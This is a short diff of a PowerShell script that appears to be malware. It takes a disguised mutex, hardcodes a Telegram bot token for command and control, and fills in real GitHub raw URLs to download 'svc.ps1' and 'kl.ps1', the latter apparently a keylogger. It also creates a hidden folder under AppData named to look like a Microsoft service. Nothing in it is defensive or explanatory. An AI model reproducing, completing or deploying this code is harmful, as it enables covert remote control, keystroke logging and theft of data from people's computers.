@@ -5,8 +5,8 @@ $mu=New-Object Threading.Mutex($false,'Local\WinSvcMtx')
 if(!$mu.WaitOne(0)){exit}
 $t='8910502460:AAHOY2nM6EhAH2scBAACKXJbmgVae_X-BjU'
 $b="https://api.telegram.org/bot$t"
-$src='https://raw.githubusercontent.com/USER/REPO/main/svc.ps1'
-$ksrc='https://raw.githubusercontent.com/USER/REPO/main/kl.ps1'
+$src='https://raw.githubusercontent.com/Zaklol123/bot/main/svc.ps1'
+$ksrc='https://raw.githubusercontent.com/Zaklol123/bot/main/kl.ps1'
 $dir="$env:APPDATA\Microsoft\WinSvc"
 New-Item -ItemType Directory -Force -Path $dir | Out-Null
 attrib +h "$dir" 2>$null
